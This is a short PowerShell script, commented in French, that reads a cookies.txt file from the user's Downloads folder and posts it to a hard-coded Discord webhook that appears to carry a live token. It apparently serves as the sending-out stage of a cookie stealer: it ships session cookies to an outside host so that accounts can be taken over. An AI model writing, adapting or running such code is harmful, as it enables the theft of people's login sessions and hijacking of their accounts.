[CmdletBinding()]
param (
    [string]$webhookUrl = 'https://discord.com/api/webhooks/1274052463669809193/05ymYqz_6ipeQWB9VvSFCEuyXummTSTlbGb-HQL-I_VcTbqgUt7blzqJ9dP7ntKd2GpJ'  # Remplacez ceci par votre URL de webhook
)

# Définir le chemin du fichier cookies.txt dans le dossier Téléchargements
$filePath = "$env:USERPROFILE\Downloads\cookies.txt"

# Vérifiez si le fichier existe
if (-Not (Test-Path $filePath)) {
    Write-Error "Le fichier spécifié n'existe pas : $filePath"
    exit
}

# Préparer le fichier pour l'envoi
$form = @{
    file = [System.IO.File]::ReadAllBytes($filePath)
}

# Envoyer le fichier au webhook Discord
try {
    $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Form $form

    if ($response -ne $null) {
        Write-Host "Fichier envoyé avec succès."
    } else {
        Write-Error "Échec de l'envoi du fichier."
    }
} catch {
    Write-Error "Une erreur est survenue : $_"
}
